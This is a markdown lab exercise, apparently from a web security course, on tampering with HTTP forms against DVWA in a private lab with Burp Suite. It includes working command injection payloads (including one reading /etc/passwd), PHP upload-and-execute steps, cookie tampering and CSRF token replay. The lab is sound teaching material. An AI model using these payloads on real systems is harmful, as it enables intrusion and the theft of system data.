# 🔬 Lab Exercise 5: HTTP Form Manipulation

> **Challenge:** Intercept and modify form data sent to the server
> **Where:** DVWA on Metasploitable + Burp Suite on Kali
> **Time:** ~35-45 minutes

---

## Setup: Configure Burp Suite Proxy

```
1. Open Burp Suite: burpsuite &
2. Go to Proxy → Proxy Settings → confirm listener on 127.0.0.1:8080
3. In Kali Firefox:
   Settings → Network → Manual Proxy
   HTTP Proxy: 127.0.0.1    Port: 8080
   Check: "Also use this proxy for HTTPS"
4. Go to Proxy → Intercept → Turn Intercept OFF (for now)
5. Browse to http://192.168.56.20/dvwa/ → Login (admin/password)
6. Set DVWA Security to "Low": http://192.168.56.20/dvwa/security.php
```

---

## Exercise 5A: Intercept and Modify a Form Submission

**Target:** DVWA Brute Force page (`http://192.168.56.20/dvwa/vulnerabilities/brute/`)

```
Step 1: Browse the page normally (Intercept OFF)
  - Go to: http://192.168.56.20/dvwa/vulnerabilities/brute/
  - Enter Username: admin, Password: test
  - Click Login
  - 📝 Note the error message you get

Step 2: Now intercept the request (Turn Intercept ON)
  - Proxy → Intercept → Turn ON
  - Enter Username: admin, Password: test
  - Click Login

Step 3: Examine the intercepted request in Burp
  - 📝 What HTTP method is used? (GET or POST?)
  - 📝 What parameters do you see?
  - 📝 Where are username/password being sent?

Step 4: Modify the request
  - Change the password parameter to: password
  - Click Forward

  ✅ EXPECTED: You're now logged in as admin!
  (because "password" is the actual DVWA admin password)
```

---

## Exercise 5B: Modify Hidden Form Fields

**Target:** DVWA Command Injection (`http://192.168.56.20/dvwa/vulnerabilities/exec/`)

```
Step 1: Normal usage (Intercept OFF)
  - Go to: http://192.168.56.20/dvwa/vulnerabilities/exec/
  - Enter an IP: 192.168.56.10
  - Click Submit
  - ✅ EXPECTED: Ping results appear

Step 2: View Page Source (Ctrl+U)
  - 📝 Find the form element
  - 📝 Are there any hidden fields?
  - 📝 What is the form action URL?
  - 📝 What parameters does it submit?

Step 3: Intercept and inject a command (Turn Intercept ON)
  - Enter: 192.168.56.10
  - Click Submit
  - In Burp, modify the ip parameter to:
    192.168.56.10; whoami
  - Click Forward
  - ✅ EXPECTED: You see ping output AND the result of 'whoami' command!

Step 4: Try more command injection payloads
  Intercept and change ip parameter to each of these:

  # List files
  192.168.56.10; ls -la

  # Read /etc/passwd
  192.168.56.10; cat /etc/passwd

  # Check current user
  192.168.56.10 && id

  # Using pipe
  192.168.56.10 | uname -a

  📝 Document which payloads worked and what info you got
```

---

## Exercise 5C: Modify Cookie Values

```
Step 1: Check your current DVWA cookies
  - In Firefox: F12 → Console → type: document.cookie
  - 📝 Write down the cookie values: _______________
  - 📝 What is the "security" cookie set to?

Step 2: Modify the security cookie via Burp
  - Turn Intercept ON
  - Navigate to any DVWA page
  - In the intercepted request, find the Cookie: header
  - Change: security=low → security=impossible
  - Click Forward
  - 📝 What happened? Did the page behavior change?

Step 3: Modify cookies via browser DevTools
  - Press F12 → Application → Cookies → http://192.168.56.20
  - Find the "security" cookie
  - Change its value from "low" to "medium"
  - Refresh the page
  - 📝 Did the DVWA security level change?
  ✅ EXPECTED: Yes! DVWA reads security level from the cookie!
```

---

## Exercise 5D: Change HTTP Method (GET ↔ POST)

```bash
# Step 1: The DVWA brute force page uses GET method
# Look at the URL after submitting the form:
# http://192.168.56.20/dvwa/vulnerabilities/brute/?username=admin&password=test&Login=Login

# Step 2: Try the same request as POST using curl
curl -X POST http://192.168.56.20/dvwa/vulnerabilities/brute/ \
  -d "username=admin&password=password&Login=Login" \
  -b "PHPSESSID=YOUR_SESSION_ID; security=low"
# 📝 Does the POST method still work?

# Step 3: Try with Burp — intercept the GET request
# Change the method line from:
#   GET /dvwa/vulnerabilities/brute/?username=admin&...
# To:
#   POST /dvwa/vulnerabilities/brute/
# And move the parameters to the request body
# 📝 Does the application accept both methods?
```

---

## Exercise 5E: Form Manipulation on DVWA File Upload

**Target:** DVWA File Upload (`http://192.168.56.20/dvwa/vulnerabilities/upload/`)

```
Step 1: Normal upload (Intercept OFF)
  - Go to: http://192.168.56.20/dvwa/vulnerabilities/upload/
  - Create a test file on Kali:
    echo "test file" > /tmp/test.txt
  - Upload test.txt using the form
  - ✅ EXPECTED: File uploaded successfully
  - 📝 Note the upload path shown

Step 2: Upload a PHP file (should work at Low security)
  - Create a PHP file:
    echo '<?php echo "Hello from PHP! Server: " . php_uname(); ?>' > /tmp/test.php
  - Upload test.php
  - ✅ EXPECTED: Upload succeeds at Low security
  - Visit: http://192.168.56.20/dvwa/hackable/uploads/test.php
  - ✅ EXPECTED: PHP executes and shows server info!

Step 3: Intercept and modify the upload (Intercept ON)
  - Create a .txt file but intercept and change Content-Type
  - In Burp, find the Content-Type header for the file
  - Change it from "text/plain" to "application/x-php"
  - Also try: Change the filename from "test.txt" to "test.php"
  - Forward the modified request
  - 📝 Did the server accept the modified upload?
```

---

## Exercise 5F: Manipulate CSRF Token

**Target:** DVWA CSRF page (`http://192.168.56.20/dvwa/vulnerabilities/csrf/`)

```
Step 1: Normal usage
  - Go to: http://192.168.56.20/dvwa/vulnerabilities/csrf/
  - This is a password change form
  - View Source (Ctrl+U)
  - 📝 Look for hidden fields — is there a CSRF token?
  - 📝 What parameters does the form submit?

Step 2: Intercept the password change
  - Turn Intercept ON
  - Enter new password: hacked123 (both fields)
  - Click Change
  - In Burp, examine the request
  - 📝 What parameters are sent?
  - 📝 Is there a token/user_token parameter?

Step 3: Replay the request
  - Right-click the request in Burp → Send to Repeater
  - In Repeater, click Send
  - 📝 Did the password change work again with the same token?
  - Modify the password in the request to something else
  - Click Send again
  - ✅ At Low security, the CSRF token is weak/not validated properly
```

---

## ✅ Completion Checklist

- [ ] Intercepted and modified form parameters with Burp (5A)
- [ ] Performed command injection via form manipulation (5B)
- [ ] Modified cookie values to change security level (5C)
- [ ] Changed HTTP methods (GET ↔ POST) (5D)
- [ ] Manipulated file upload parameters (5E)
- [ ] Explored CSRF token manipulation (5F)

---

**Next:** [Challenge 6: Client-Side Validation Bypass →](./06_lab_validation_bypass.md)
